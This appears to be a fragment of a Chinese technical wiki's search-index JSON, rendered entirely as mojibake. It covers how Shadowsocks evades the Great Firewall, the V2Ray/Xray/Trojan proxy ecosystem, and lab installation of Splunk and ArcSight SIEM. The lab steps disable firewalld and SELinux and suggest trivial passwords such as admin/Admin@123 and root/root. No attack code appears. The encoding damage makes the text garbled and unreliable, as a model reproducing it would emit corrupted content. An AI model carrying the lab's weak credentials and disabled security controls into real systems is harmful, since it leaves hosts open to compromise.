å®Œåï¼Œä¼šäº¤ç”±sså®¢æˆ·ç«¯æŒ‰ssåè®®å°è£…ï¼Œè¿™ä¸ªå°è£…ä¼šå¯¹åŸå§‹æ•°æ®åŒ…åº”ç”¨å±‚çš„æ•°æ®åŠ å¯†ã€‚éšåï¼Œssåè®®æ•°æ®åŒ…åˆ°GFWï¼Œç”±äºssèŠ‚ç‚¹ä¸åœ¨GFWé»‘åå•ä¸­ä¸”GFWçœ‹ä¸åˆ°æ•°æ®åŒ…ä¸­çš„åº”ç”¨å±‚æ•°æ®ï¼ˆå› ä¸ºåŠ å¯†äº†ï¼‰ï¼Œäºæ˜¯æ”¾è¡Œã€‚æ•°æ®åŒ…åˆ°è¾¾ssæœåŠ¡å™¨ï¼ŒssæœåŠ¡å™¨è§£å¯†è¿˜åŸï¼ŒçŸ¥é“ç”¨æˆ·Aè¦è®¿é—®è°·æ­ŒwebæœåŠ¡å™¨ï¼Œäºæ˜¯å»è®¿é—®è°·æ­ŒwebæœåŠ¡å™¨ï¼Œå°†è°·æ­ŒwebæœåŠ¡å™¨å“åº”çš„æ•°æ®å†åŠ å¯†ï¼Œå†ä»¥ssåè®®å‘å›ç»™ç”¨æˆ·ã€‚ ä½†GFWä¹Ÿä¼šæœ‰ä¸»åŠ¨æ¢æµ‹çš„æ‰‹æ®µï¼Œæ¯”å¦‚é‡æ”¾æ”»å‡»ï¼Œä¸»åŠ¨å‘ssèŠ‚ç‚¹å‘åŒ…æ¥æ¢æµ‹æ˜¯ä¸æ˜¯è¿è¡Œäº†shadowsocksæœåŠ¡ï¼Œå¦‚æœæ˜¯ï¼Œä¼šå°†è¯¥å¢ƒå¤–vpsæ‹‰å…¥é»‘åå• å‚è€ƒï¼šèŠ‚ç‚¹æ­å»ºç³»åˆ—(2)ï¼šGFWé˜²ç«å¢™æ˜¯æ€ä¹ˆé˜»æ–­æˆ‘ä»¬å’Œè°·æ­Œçš„è¿æ¥ï¼Ÿå¦‚ä½•ç»•è¿‡é˜²ç«å¢™çš„æ‹¦æˆªï¼ŸDNSæ±¡æŸ“æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿæ­å»ºèŠ‚ç‚¹ä¹‹å‰å¿…é¡»çŸ¥é“çš„çŸ¥è¯†"},{"title":"ç›¸å…³æ¦‚å¿µ","path":"/wiki/Proxy_Protocols/ç›¸å…³æ¦‚å¿µ_ç§‘å­¦ä¸Šç½‘æŠ€æœ¯.html","content":"ç›¸å…³æ¦‚å¿µ ä»£ç†åè®®ï¼šssã€trojanã€vmessã€vless VMessåè®®ï¼šVMessæ˜¯ç”±V2Ray-coreå¼€å‘å›¢é˜Ÿè®¾è®¡çš„ä¸€ç§ä»£ç†åè®®ï¼Œå®ƒæ˜¯V2Rayè½¯ä»¶çš„ä¸€éƒ¨åˆ†ã€‚V2Rayæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œæ”¯æŒå¤šç§ä»£ç†åè®®ï¼Œå¸®åŠ©ç”¨æˆ·æ„å»ºè‡ªå·±çš„ä»£ç†æ¥ç»•è¿‡ç½‘ç»œé™åˆ¶ã€‚githubä¸Šçš„Aboutæ˜¯ï¼šâ€œA platform for building proxies to bypass network restrictionsâ€ã€‚ V2Rayå’ŒProject Vï¼šProjece Væ˜¯ä¸€ä¸ªç½‘ç»œå·¥å…·çš„é›†åˆï¼Œgithubä¸Šçš„ä»‹ç»æ˜¯â€œProject V is a set of network tools that help you to build your own computer network.â€ã€‚å…¶ä¸­ï¼ŒV2Rayæ˜¯Project Vçš„æ ¸å¿ƒå·¥å…·ã€‚V2Rayé¡¹ç›®æœ€åˆæ‰˜ç®¡åœ¨GitHubä¸Šçš„é“¾æ¥v2rayçš„v2ray-coreï¼Œä½†åœ¨é¡¹ç›®åˆ›å§‹äººVictoria Raymondå¤±è”åï¼Œç”±äºå…¶ä»–ç»´æŠ¤è€…æ²¡æœ‰å®Œæ•´çš„é¡¹ç›®æƒé™ï¼Œäºæ˜¯å¤§å®¶åˆ›å»ºäº†æ–°çš„ç¤¾åŒºï¼šV2Flyï¼Œé¡¹ç›®çš„ç»´æŠ¤å’Œæ›´æ–°è½¬ç§»åˆ°äº†æ–°çš„ç¤¾åŒºV2Flyï¼Œç›¸åº”çš„GitHubä»“åº“ä¹Ÿæ›´æ–°ä¸ºV2Flyçš„v2ray-coreã€‚ åŸå§‹åœ°å€ è¿ç§»åçš„æ–°åœ°å€ v2ray-core https://github.com/v2ray/v2ray-core https://github.com/v2fly/v2ray-core Projext V https://www.v2ray.com/index.html https://www.v2fly.org/ XTLSåè®®ï¼šXTLSæ˜¯V2Rayå›¢é˜Ÿæˆå‘˜rprxä¸ºè§£å†³TLS in TLSçš„ç‰¹å¾é—®é¢˜è€Œå‘æ˜çš„ã€‚ä½†ç”±äºLicenseé—®é¢˜ï¼ŒXTLSä»V2Rayä¸­ç§»é™¤ï¼Œå¹¶ä¸”rprxç‹¬ç«‹å‡ºæ¥åˆ›å»ºäº†xrayï¼Œxrayå’Œv2rayä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç½‘ç»œå¹³å°å·¥å…·ï¼Œæ”¯æŒå¤šç§ä»£ç†åè®®ï¼Œä½†åªæœ‰xrayæ”¯æŒXTLSã€‚ Project Xï¼šä¸Project Vç›¸å¯¹åº”ï¼ŒProject Xæ˜¯å›´ç»•XRayå·¥å…·çš„é›†åˆã€‚ ç½‘ç»œå·¥å…·é›†åˆ é›†åˆé‡Œè¾¹çš„æ ¸å¿ƒç½‘ç»œå·¥å…· å†…æ ¸ Project V V2Ray v2ray-core Project X XRay xray core å‚è€ƒï¼šV2Rayã€Trojanã€XRay ä»£ç†è½¯ä»¶å®¢æˆ·ç«¯å·¥å…·ï¼šv2RayNã€clashã€‚éƒ½æ˜¯GUIç•Œé¢ï¼ŒGUIåªæ˜¯æ–¹é¢ç”¨æˆ·æ“ä½œï¼Œå®é™…ä¸Šé€šè¿‡è°ƒç”¨å†…æ ¸åŠŸèƒ½æ¥å®ç°ç§‘å­¦ä¸Šç½‘åŠŸèƒ½ã€‚ v2rayN A GUI client for Windows, support Xray core and v2fly core and others Trojan-Goæ˜¯ä½¿ç”¨Goå®ç°çš„Trojanï¼Œåœ¨åŠŸèƒ½ä¸Šæ˜¯Trojançš„è¶…é›†ã€‚å®ƒæ–°å¢äº†å¾ˆå¤šåŠŸèƒ½ï¼šå¤šè·¯å¤ç”¨ã€è‡ªå®šä¹‰è·¯ç”±ã€CDN è½¬å‘ç­‰ç­‰ï¼Œä½†æ˜¯æœ€åº•å±‚åè®®è¿˜æ˜¯åŸç‰ˆTrojanã€‚ Item å¤‡æ³¨ v2rayN ä»£ç†å®¢æˆ·ç«¯è½¯ä»¶èƒ½å¯¹èŠ‚ç‚¹æµ‹é€Ÿï¼ˆæµ‹è¯•çœŸè¿æ¥ï¼‰ä½†ssèŠ‚ç‚¹æ— æ³•ä½¿ç”¨plugin GitHub - shadowsocks/v2ray-plugin: A SIP003 plugin based on v2ray shadowsocksæ’ä»¶ï¼Œå¯¹ssæµé‡è¿›è¡Œä¼ªè£… GitHub - shadowsocks/shadowsocks-windows: A C# port of shadowsocks Shadowsocks for Windowså®¢æˆ·ç«¯è½¯ä»¶ v2rayN è¦ä¸‹å¸¦Coreçš„æ–‡ä»¶ï¼Œè¦ä¸æ·»åŠ èŠ‚ç‚¹åä¼šæŠ¥é”™â€œè¿è¡ŒCoreå¤±è´¥ï¼Œè¯·çœ‹æ—¥å¿—â€ ä¸‹è½½æ–‡ä»¶è¯´æ˜ windows x64 v2rayN-With-Core.zip åŒ…å«æ‰€æœ‰Coreæ–‡ä»¶ï¼Œå¦‚æ‚¨ç¬¬ä¸€æ¬¡è¯·ä¸‹è½½æ­¤åŒ… v2rayN.zipä¸åŒ…å«Coreæ–‡ä»¶ zz-v2rayN-With-Core-SelfContained.7zï¼ŒåŒ…å«æ‰€æœ‰Coreæ–‡ä»¶ï¼›ç‹¬ç«‹åŒ…ï¼Œä¸éœ€è¦ä¸‹è½½å®‰è£…[Microsoft .NET 6.0 Desktop Runtime] é€‰ä¸­èŠ‚ç‚¹ï¼Œå³é”® æµ‹è¯•æœåŠ¡å™¨å»¶è¿ŸPing ICMPåè®®æµ‹ç½‘ç»œå»¶è¿Ÿ æµ‹è¯•æœåŠ¡å™¨å»¶è¿ŸTcping TCPåè®®æµ‹ç½‘ç»œå»¶è¿Ÿï¼Œé€šè¿‡å»ºç«‹TCPè¿æ¥åˆ°æœåŠ¡å™¨çš„ç‰¹å®šç«¯å£ï¼ˆé€šå¸¸æ˜¯HTTPçš„80ç«¯å£æˆ–HTTPSçš„443ç«¯å£ï¼‰ï¼Œæ¥æµ‹é‡å»ºç«‹è¿æ¥çš„æ—¶é—´ æµ‹è¯•æœåŠ¡å™¨çœŸè¿æ¥å»¶è¿Ÿï¼ˆç”¨vpsä½œä¸ºä»£ç†å¾€è°·æ­Œå‘é€è¯·æ±‚ï¼Œæ¨¡æ‹ŸçœŸå®ä½¿ç”¨çš„å»¶è¿Ÿï¼‰ï¼Œç”¨è¿™ä¸ªé€‰é¡¹çœ‹èƒ½å¦ä½¿ç”¨ä»£ç†æœåŠ¡å™¨è¿›è¡Œä»£ç†ä¸Šç½‘ å®é™…å»ºç«‹ä¸€ä¸ªå®Œæ•´çš„è¿æ¥å¹¶å¯èƒ½è¿›è¡Œä¸€äº›æ•°æ®äº¤æ¢ï¼Œä»¥æ›´å‡†ç¡®åœ°æ¨¡æ‹Ÿåœ¨å®é™…ä½¿ç”¨ä¸­çš„å»¶è¿Ÿã€‚è¿™å¯èƒ½åŒ…æ‹¬å»ºç«‹è¿æ¥ã€è¿›è¡Œæ¡æ‰‹ã€å‘é€ä¸€äº›æ•°æ®åŒ…ç­‰è¿‡ç¨‹"},{"title":"Splunk","path":"/wiki/SIEM_env_building/Splunk.html","content":"[toc] æœ¬æ–‡åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š å¦‚ä½•å®‰è£…Splunk Serverå’ŒSplunk Forward å®‰è£…åï¼Œå¦‚ä½•äº§ç”Ÿäº‹ä»¶ï¼Œä»¥åŠæ¯”å¯¹æœ¬åœ°ä¸Splunk Serveræ˜¯å¦å­˜åœ¨ç›¸åŒçš„æ—¥å¿—çš„æ–¹æ³• å®‰è£…åŒ…ä¸‹è½½ Splunk 8.2.3 Windows: https://download.splunk.com/products/splunk/releases/8.2.3/windows/splunk-8.2.3-cd0848707637-x64-release.msi Linux: https://download.splunk.com/products/splunk/releases/8.2.3/linux/splunk-8.2.3-cd0848707637-Linux-x86_64.tgz Splunk Universal Forwarder 8.2.3 Windows: https://download.splunk.com/products/universalforwarder/releases/8.2.3/windows/splunkforwarder-8.2.3-cd0848707637-x64-release.msi Linux: https://download.splunk.com/products/universalforwarder/releases/8.2.3/linux/splunkforwarder-8.2.3-cd0848707637-Linux-x86_64.tgz æ³¨ï¼šLinuxç‰ˆå®‰è£…è¿è¡Œåªéœ€è¦è§£å‹ç¼©taråŒ…ï¼Œæ‰§è¡Œbin/splunk startå³å¯ã€‚ åŸå§‹ä¸‹è½½é¡µé¢çš„æºä»£ç å½“ä¸­åŒ…å«ä¸‹è½½é“¾æ¥ï¼š Splunk: https://www.splunk.com/en_us/download/splunk-enterprise.html Splunk Universal Forwarder: https://www.splunk.com/en_us/download/universal-forwarder.html Splunkæ¯ä¸ªç‰ˆæœ¬ï¼ˆå¦‚8.2.3ï¼‰ä¸‹è½½é“¾æ¥ä¸­åå…­è¿›åˆ¶çš„éƒ¨åˆ†éƒ½æ˜¯å›ºå®šçš„ï¼ˆå¦‚cd0848707637ï¼‰ã€‚çŸ¥é“æ–‡ä»¶åå°±å¯ä»¥è‡ªå·±æ„é€ ä¸‹è½½é“¾æ¥ã€‚ï¼ˆgoogleæœsplunk-8.2.3- x release.msiæœåˆ°åå…­è¿›åˆ¶çš„éƒ¨åˆ†ï¼‰ã€‚ è™šæ‹Ÿæœºæ¸…å• Splunk Serverï¼Œwindowsä¸»æœºã€‚ Splunk Forwardï¼Œwindowsã€linuxå‡å¯ã€‚é…ç½®è½¬å‘æ•°æ®åˆ°Splunk Serverã€‚ æœåŠ¡ç«¯å®‰è£… åŒå‡»å®‰è£…åŒ…å®‰è£…Splunk Serverï¼Œä¸­é€”éœ€é…ç½®ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼ˆå¯è®¾ç½®ä¸ºadmin/Admin@123ï¼‰ å…³é—­è™šæ‹ŸæœºAçš„é˜²ç«å¢™ å®‰è£…å®Œæˆåï¼Œ127.0.0.1:8000ç™»å½•åå°ç®¡ç†é¡µé¢ï¼Œâ€œè®¾ç½®â€-â€œè½¬å‘å’Œæ¥æ”¶â€ï¼Œâ€œæ¥æ”¶æ•°æ®â€ç‚¹å‡»â€œ+æ–°å¢â€ï¼Œæ–°é¡µé¢ä¸­é€‰æ‹©â€œæ–°æ¥æ”¶ç«¯å£â€ï¼Œæ–°å¢9997ç«¯å£ é…ç½®ç›‘å¬ç«¯å£ Splunk Forwardå®‰è£… åŒå‡»æ¡Œé¢çš„å®‰è£…åŒ…å®‰è£…Splunk Forwarderã€‚è¯ä¹¦éƒ¨åˆ†ä¸å¡«å†™ï¼ŒLocal Syatemï¼ŒWindows Events Logså’ŒPerformance Monitorå…¨éƒ¨æ‰“å‹¾ï¼Œä¸­é€”éœ€é…ç½®ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼ˆå¯è®¾ç½®ä¸ºclient/Client@123ï¼‰ï¼Œè®¾ç½®SplunkæœåŠ¡å™¨ä¸ºè™šæ‹ŸæœºAip:8089ï¼Œè½¬å‘æ•°æ®åˆ°SplunkæœåŠ¡å™¨ä¸ºè™šæ‹ŸæœºAip:9997 ï¼ˆè¿™éƒ¨åˆ†ä¸å¡«ï¼Œç›´æ¥ä¸‹ä¸€æ­¥) è®¾ç½®è´¦å·å’Œå¯†ç ï¼Œé‡å¯æˆ–è€…æŸ¥çœ‹é…ç½®ä¼šæç¤ºè¾“å…¥ï¼Œè¿˜æ˜¯è¦è®°ä½ é…ç½®Splunk Server é…ç½®Splunk Serveræ¥æ”¶è½¬å‘å™¨æ•°æ®çš„ç«¯å£ã€‚ï¼ˆä¹‹å‰åœ¨Splunk Serverä¸­æ–°å¢çš„9997ç«¯å£åœ¨è¿™é‡Œç”¨ä¸Šäº†) â€œæœ¬åœ°å®‰å…¨ç­–ç•¥â€è®¾ç½®â€œå®¡æ ¸è´¦æˆ·ç®¡ç†â€ä¸ºæˆåŠŸã€å¤±è´¥ã€‚ï¼ˆåé¢ç”¨ç®¡ç†å‘˜cmdä¿®æ”¹è´¦æˆ·å¯†ç æ—¶æœ¬åœ°äº‹ä»¶æŸ¥çœ‹å™¨å°±ä¼šè®°å½•ç›¸åº”çš„æ—¥å¿—ï¼‰ Splunk Serverï¼š åœ¨å³ä¸Šè§’â€œè½¬å‘å™¨ç®¡ç†â€ï¼Œçœ‹åˆ°æœ‰è½¬å‘å™¨æ­£åœ¨è½¬å‘æ•°æ® å¦‚æœæ²¡çœ‹åˆ°ï¼Œæ£€æŸ¥é˜²ç«å¢™ï¼Œé‡å¯serverå’Œforwarderã€‚å®åœ¨ä¸è¡Œå°±é‡è£…ã€‚ æ—¥å¿—æ ·ä¾‹ äº§ç”Ÿäº‹ä»¶çš„æ ·ä¾‹ï¼š åœ¨Splunk Forwardçš„è™šæœºä¸­ï¼š ä»¥ç®¡ç†å‘˜cmdä¿®æ”¹testè´¦æˆ·å¯†ç ä¸ºabcä½œä¸ºä¾‹å­ï¼Œæ‰§è¡Œ 1net user test abc å‘½ä»¤åï¼Œåœ¨æœ¬åœ°çš„&quot;äº‹ä»¶æŸ¥çœ‹å™¨&quot;-&quot;å®‰å…¨&quot;ä¸­æœ‰3æ¡ä¸è¯¥æ¡å‘½ä»¤ç›¸å…³çš„æ—¥å¿—ï¼Œç¼–å·åˆ†åˆ«ä¸º4724ã€4738ã€4798 åŒæ—¶ï¼Œåœ¨Splunk Serveræœç´¢ï¼Œä¹Ÿèƒ½çœ‹åˆ°è¿™ä¸‰æ¡æ—¥å¿—ï¼Œå†…å®¹ä¸€è‡´ ç«¯å£è½¬å‘ç±»äº‹ä»¶ æœ¬æ–‡è®²è¿°åœ¨Splunk Serverç«¯å¯¹Splunk Forwardç«¯å¼€å¯ç«¯å£è½¬å‘ï¼Œå€¾å¬æ•°æ®ï¼Œå°†è¯¥ç«¯å£æ”¶åˆ°çš„æ•°æ®æ”¶é›†åˆ°Serverç«¯ã€‚ Splunk Serverè®¾ç½®-æ•°æ®è¾“å…¥-è½¬å‘çš„è¾“å…¥-UDPï¼Œç‚¹å‡»æ–°å¢ é€‰å®šä¸»æœºï¼Œè¾“å…¥æ–°å»ºæœåŠ¡å™¨ç±»åç§°ï¼Œæ¯”å¦‚udp1999-test é€‰æ‹©UDPï¼Œ1999 æ–°å»ºä¸€ä¸ªç´¢å¼•ï¼Œæ¯”å¦‚udp1999-index æ£€æŸ¥ æäº¤ å¼€å§‹æœç´¢ æ²¡äº‹ä»¶ï¼Œå—¯ï¼Œæ­£å¸¸ å®¢æˆ·ç«¯ï¼š åŒå‡»syslogsender_setupå®‰è£…ï¼Œé»˜è®¤ç‚¹ç‚¹ç‚¹å³å¯ï¼Œåˆ›å»ºæ¡Œé¢å›¾æ ‡å¯ä»¥å‹¾ä¸€ä¸‹ æ‰“å¼€Star SysLog Senderï¼Œå‘1999ç«¯å£å‘é€Messageï¼Œç‚¹å‡»SysLog Send å†æ¬¡åœ¨Splunk Serveræœç´¢ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°åˆšæ‰å‘é€çš„æ¶ˆæ¯ï¼ŒåŠè‡ªå·±è¾“çš„å­—æ®µ æ‹“å±• forwardå®é™…ä¸Šæ˜¯é˜‰å‰²ç‰ˆçš„serverï¼Œç›´æ¥æ‹¿serverï¼Œä¸€äº›ç±»å‹äº‹ä»¶åªèƒ½ç”±è£…serverç„¶åå¯¹è‡ªèº«è¿›è¡Œç›‘æ§æ”¶é›†ã€‚ å‚è€ƒé“¾æ¥ æœåŠ¡ç«¯ å®‰è£…æ•™ç¨‹ï¼šhttp://buaq.net/go-90176.html å®¢æˆ·ç«¯ https://wooyun.js.org/drops/Splunkå®æˆ˜ï¼ˆä¸€ï¼‰â€”â€”ç´¢å¼•å™¨é…ç½®ä»¥åŠè½¬å‘å™¨å®‰è£…é…ç½®è¯´æ˜ .html Splunk + Forwarder æ”¶é›†åˆ†æWindowsç³»ç»Ÿæ—¥å¿—"},{"title":"Arcisght","path":"/wiki/SIEM_env_building/Arcisght.html","content":"[toc] æœ¬èŠ‚ä»‹ç»å¦‚ä½•æ­å»ºArcsight recon1.2ç¯å¢ƒï¼Œé‡‡ç”¨All-in-One installtion type with Database co-located with CDF node.It will install CDF,Arcsight Suite,NFS and Database on a single node.ä½¿ç”¨çš„æ˜¯Using Arcsight Platform Installer(P65é¡µ)ç¼–å†™é…ç½®yamlæ–‡ä»¶ï¼Œç„¶åç”¨å®˜æ–¹æä¾›çš„è„šæœ¬è¿›è¡Œå®‰è£…ã€‚ æ€»ä½“æ­¥éª¤ å› å®‰è£…éœ€æ±‚ä¸åŒï¼Œç°åœºæƒ…å†µåˆ†ä¸ºèƒ½è”ç½‘æˆ–ä¸èƒ½è”ç½‘ï¼Œèƒ½è”ç½‘å’Œä¸èƒ½è”ç½‘å®‰è£…æ—¶çš„æ­¥éª¤æœ‰äº›è®¸å‡ºå…¥ï¼Œä¸‹é¢æ˜¯ä¸¤è€…å®‰è£…æ­¥éª¤çš„checklistï¼Œè¯·æ ¹æ®å®‰è£…éœ€æ±‚å’Œå®é™…æƒ…å†µé€‰æ‹©ç›¸åº”çš„æ­¥éª¤è¿›è¡Œå®‰è£…ã€‚ å‡éœ€è¦ï¼šæ­å»ºDNSæœåŠ¡å™¨ æŒ‰éœ€é€‰æ‹©ï¼š âˆšï¼šéœ€è¦ Ã—ï¼šä¸éœ€è¦ åºå· Task è™šæœºèƒ½è”ç½‘ è™šæœºä¸èƒ½è”ç½‘ 1 å®‰è£…ä¸€äº›åŒ…åŠä¾èµ– Ã— âˆš 2 æ­å»ºæœ¬åœ°yumæº Ã— âˆš 3 ä¸»æœºåã€å…³é—­ipv6ã€è®¾ç½®é™æ€ipã€DNS âˆš âˆš 4 chronyå®¢æˆ·ç«¯é…ç½® âˆšï¼ˆé…ç½®chronyæœåŠ¡å™¨å¯ä»¥æ˜¯å¤–ç½‘æˆ–å†…ç½‘ï¼‰ âˆšï¼ˆæ­å»ºå†…ç½‘chronyæœåŠ¡ç«¯+é…ç½®æŒ‡å‘å†…ç½‘çš„chronyæœåŠ¡å™¨ä½œä¸ºæ—¶é’Ÿæºï¼‰ 5 ç›¸å…³å®‰è£…æ–‡ä»¶å‡†å¤‡ï¼ˆ6ä¸ªï¼‰ âˆš âˆš 6 å¼€å§‹å®‰è£… âˆš âˆš æ–‡ä»¶æ¸…å• æœåŠ¡ç«¯å®‰è£…æ–‡ä»¶ä¸€å…±6ä¸ªï¼š recon-single-node.yamlå› ä¸ºæ–‡ä»¶å†…å®¹å¯èƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸ç»™å‡ºMD5è¿›è¡Œæ ¡éªŒ æ–‡ä»¶å MD5 arcsight-installer-metadata-21.1.0.9.tar e08fe2f12e1c1bf41b6ef8e39f9b8ace arcsight-platform-installer-21.1.0.9.zip e621e053545b6c1d766699bd077feb88 fusion-1.3.0.9.tar c0820209f28eeaf7b72e6af197a4a617 recon-1.2.0.9.tar 99193eebf694ff864dfcccfd956e3d11 transformationhub-3.5.0.9.tar 4ab57e71194bc454bcf2e47fbb818449 æ­å»ºæœ¬åœ°yumæºç”¨çš„æ–‡ä»¶ï¼šCentOS-7-x86_64-DVD-2009.iso æœ¬æ–‡ä¸­æåˆ°çš„è™šæ‹Ÿæœºæ¸…å• æˆªå›¾å’Œæ–‡ç« ä¸­çš„ipå¤§éƒ¨åˆ†èƒ½å¯¹åº”ä¸Šï¼Œå°‘éƒ¨åˆ†å¯¹åº”ä¸ä¸Šã€‚å› ä¸ºæ˜¯åœ¨å¤šæ¬¡å®‰è£…è¿‡ç¨‹ä¸­å†™çš„æ–‡æ¡£ï¼Œè¯·è‡ªè¡ŒåŒºåˆ«ã€‚ è™šæ‹Ÿæœºåç§° é™æ€IP åŸŸå å¤‡æ³¨ è´¦å·å¯†ç  DNS-Windows Server 2012 192.168.147.135 æ—  DNSæœåŠ¡å™¨ win10/æ— å¯† CentOS 7 x64 NTP Server 192.168.147.201 NTPæœåŠ¡å™¨ root/root,user/user Arcsight Server Single Node-CentOS 7 x64 192.168.147.133 cdf6.arcsight-test.com ArcsightæœåŠ¡ç«¯ root/root,user/user Win Events Log-Windows 10 x64 192.168.147.199 Arcsighté‡‡é›†å™¨å®¢æˆ·ç«¯ win10/æ— å¯† syslog-Windows 10 x64 192.168.147.143 Arcsighté‡‡é›†å™¨å®¢æˆ·ç«¯ï¼ˆç«¯å£è½¬å‘ï¼‰ win10/æ— å¯† Client-Ubuntu x64 20.04 æ— æ‰€è°“ Arcisghté‡‡é›†å™¨å®¢æˆ·ç«¯ï¼ˆæœ¬åœ°csvæ–‡ä»¶ï¼‰ root/root,user/user DNSæœåŠ¡å™¨ ä½¿ç”¨windowsã€linuxã€FreeBSDç­‰å½“DNSæœåŠ¡å™¨å‡å¯ï¼Œè®¾ç½®ArcsightæœåŠ¡å™¨åŸŸåä¸IPçš„æ­£å‘è§£æã€‚ chronyæœåŠ¡å™¨é…ç½®ï¼ˆoptï¼‰ CentOS 7 x64 NTP Server å…³é—­é˜²ç«å¢™ 12systemctl stop firewalldsystemctl disable firewalld ç¡®å®šé˜²ç«å¢™å·²å…³é—­ï¼ŒçŠ¶æ€æ˜¾ç¤ºdead 1systemctl status firewalld å…³é—­SELinux ä¸´æ—¶å…³é—­ 1setenforce 0 æ°¸ä¹…å…³é—­ ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/selinux/config,å°†å…¶ä¸­SELINUXè®¾ç½®ä¸ºdisabled 12- SELINUX=enforcing + SELINUX=disabled é‡å¯ç”Ÿæ•ˆï¼Œä½¿ç”¨sestatusæŸ¥çœ‹SELinuxçŠ¶æ€ é…ç½®NTPæœåŠ¡å™¨ 1vi /etc/chrony.conf æ³¨é‡Šæ‰å¤–éƒ¨æ—¶é’Ÿï¼Œå› ä¸ºå†…ç½‘ç¯å¢ƒï¼Œä¸Šä¸äº†ç½‘ã€‚å¢åŠ è‡ªèº«ipä½œä¸ºæ—¶é’ŸæœåŠ¡å™¨ã€‚ allowå‘½ä»¤æŒ‡å…è®¸å“ªäº›ipé€šè¿‡è®¿é—®åˆ°è‡ªå·±ã€‚ local stratum 10æŒ‡å½“å¤–éƒ¨æ—¶é’Ÿè®¿é—®ä¸åˆ°æ—¶ï¼Œå…è®¸è‡ªèº«ä½œä¸ºæ—¶é’ŸæœåŠ¡å™¨æ¥æ ¡å‡†å®¢æˆ·ç«¯ 123456789101112131415161718192021222324252627282930313233343536373839404142# These servers were defined in the installation:+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16+ allow 192.168.147.0/24 # Serve time even if not synchronized to a time source.+ local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking é‡å¯chrony 1systemctl restart chronyd.service Arcsight reconæœåŠ¡ç«¯æ­å»º è™šæ‹ŸæœºåŠç¡¬ä»¶è¦æ±‚ Required OS:CentOS~~/RHEL~~ 7.7ï¼Œ7.8 or 7.9 æˆ‘ç”¨çš„CentOS-7-x86_64-DVD-2009.isoï¼Œå¯ä¾›å‚è€ƒ RHELåˆ«äººå°è¯•ç”¨è¿‡ï¼Œæ²¡æˆåŠŸ åœ¨VMæ–°å»ºè™šæ‹Ÿæœºæ—¶ï¼Œé…ç½®è¦æ±‚å¦‚ä¸‹ï¼š Category Requirement Single node (master and worker) 1 CPU cores (per node) 8 RAM (per node) 32 Disks (per node) 1 Storage per day (1x) 15GB Total disk space (1.5 billion events) 500GB ç£ç›˜åˆ†åŒºï¼š swap â€” 3GB /boot â€” 1GB /home â€” 30GB /opt ---- 250GBä»¥ä¸Š / â€” 60GBä»¥ä¸Š å®‰è£…æ¡Œé¢ç‰ˆï¼ˆGNOKEæˆ–Server GUIéƒ½è¡Œï¼‰ å®‰è£…ä¸€äº›åŒ…åŠä¾èµ– å®‰è£…åŸå› ï¼š åœ¨åç»­æ­¥éª¤ä½¿ç”¨arcsight-installå‘½ä»¤çš„preinstallå‚æ•°æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥å¹¶å°è¯•è‡ªåŠ¨å®‰è£…ç¼ºå¤±çš„æ“ä½œç³»ç»ŸåŒ…ä¾èµ–é¡¹ã€‚å¦‚æœè™šæ‹Ÿæœºèƒ½ä¸Šç½‘ï¼Œå®ƒå°±èƒ½æˆåŠŸå®‰è£…ç¼ºå¤±çš„ä¾èµ–é¡¹ã€‚å¦‚æœè™šæ‹Ÿæœºä¸èƒ½ä¸Šç½‘ï¼Œå®ƒå°è¯•è¿æ¥é€ä¸ªé•œåƒæºï¼Œä½†å› ä¸ºä¸èƒ½è”ç½‘ï¼Œéƒ½ä¼šå¤±è´¥ï¼Œå¯¼è‡´ä¸€äº›åŒ…æ²¡æœ‰è¢«å®‰è£…æˆ–æ›´æ–°ï¼Œå°±ä¼šå¯¼è‡´åç»­æ­¥éª¤æ— æ³•ç»§ç»­è¿›è¡Œã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦æ—©æ—©è‡ªè¡Œå°†è¿™äº›åŒ…å®‰è£…å¥½ã€‚ 1yum install conntrack-tools container-selinux curl device-mapper-libs httpd-tools java-1.8.0-openjdk libgcrypt libseccomp libtool-libs libtool-ltdl lvm2 net-tools nfs-utils rpcbind socat systemd-libs unzip bind-utils tar tips:æˆ‘è¯•äº†ç¦»çº¿åŒ…å®‰è£…çš„æ–¹å¼ï¼Œæ²¡è¯•å¥½ï¼Œå¦‚æœä½ æœ‰æ—¶é—´å¯ä»¥å°è¯•ç”¨ç¦»çº¿åŒ…çš„æ–¹å¼è¿›è¡Œå®‰è£…ã€‚ æˆ‘æ˜¯è¿™æ ·åšçš„ï¼šåœ¨ä¸€å°å¯ä¸Šç½‘çš„VMä¸­å®‰è£…centosï¼Œç„¶åæ‰§è¡Œä¸Šè¿°å‘½ä»¤ï¼Œå…³æœºï¼Œå¯¼å‡ºovfï¼Œå†å¯¼å…¥åˆ°ä¸èƒ½è”ç½‘çš„VMwareä¸­ä½¿ç”¨ã€‚ æ­å»ºæœ¬åœ°yumæº å®‰è£…åŸå› ï¼š 